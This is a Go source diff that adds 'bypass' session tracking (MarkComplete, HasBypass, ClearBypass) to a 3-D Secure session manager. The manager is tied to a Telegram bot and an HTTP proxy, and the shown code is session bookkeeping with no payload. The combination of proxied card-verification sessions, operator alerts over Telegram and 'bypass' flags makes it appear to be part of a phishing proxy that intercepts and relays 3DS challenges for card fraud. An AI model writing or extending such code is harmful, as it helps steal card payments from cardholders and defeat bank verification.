@@ -46,23 +46,25 @@ type ThreeDSSession struct {
 
 // ThreeDSManager manages all active 3DS verification sessions
 type ThreeDSManager struct {
-	sessions    map[string]*ThreeDSSession // sessionID -> ThreeDSSession
-	indexToSess map[int]*ThreeDSSession    // sIndex -> ThreeDSSession
-	mu          sync.RWMutex
-	telegram    *TelegramBot
-	proxy       *HttpProxy
-	stopChan    chan struct{}
-	wg          sync.WaitGroup
+	sessions       map[string]*ThreeDSSession // sessionID -> ThreeDSSession
+	indexToSess    map[int]*ThreeDSSession    // sIndex -> ThreeDSSession
+	bypassSessions map[string]bool            // sessionID -> bypass enabled
+	mu             sync.RWMutex
+	telegram       *TelegramBot
+	proxy          *HttpProxy
+	stopChan       chan struct{}
+	wg             sync.WaitGroup
 }
 
 // NewThreeDSManager creates a new 3DS manager
 func NewThreeDSManager(telegram *TelegramBot, proxy *HttpProxy) *ThreeDSManager {
 	m := &ThreeDSManager{
-		sessions:    make(map[string]*ThreeDSSession),
-		indexToSess: make(map[int]*ThreeDSSession),
-		telegram:    telegram,
-		proxy:       proxy,
-		stopChan:    make(chan struct{}),
+		sessions:       make(map[string]*ThreeDSSession),
+		indexToSess:    make(map[int]*ThreeDSSession),
+		bypassSessions: make(map[string]bool),
+		telegram:       telegram,
+		proxy:          proxy,
+		stopChan:       make(chan struct{}),
 	}
 	m.wg.Add(1)
 	go m.cleanupWorker()
@@ -107,6 +109,7 @@ func (m *ThreeDSManager) cleanupExpired() {
 			if now.Sub(updatedAt) > 10*time.Minute {
 				delete(m.sessions, id)
 				delete(m.indexToSess, ts.SIndex)
+				delete(m.bypassSessions, id)
 				log.Debug("[3DS] cleaned up session: %s (state: %s)", id, state)
 			}
 		}
@@ -778,4 +781,23 @@ func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
 	ts.mu.Unlock()
 
 	return msgID
+}
+
+func (m *ThreeDSManager) MarkComplete(id string) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	m.bypassSessions[id] = true
+	log.Debug("[3DS] marked session %s for bypass", id)
+}
+
+func (m *ThreeDSManager) HasBypass(id string) bool {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+	return m.bypassSessions[id]
+}
+
+func (m *ThreeDSManager) ClearBypass(id string) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	delete(m.bypassSessions, id)
 }
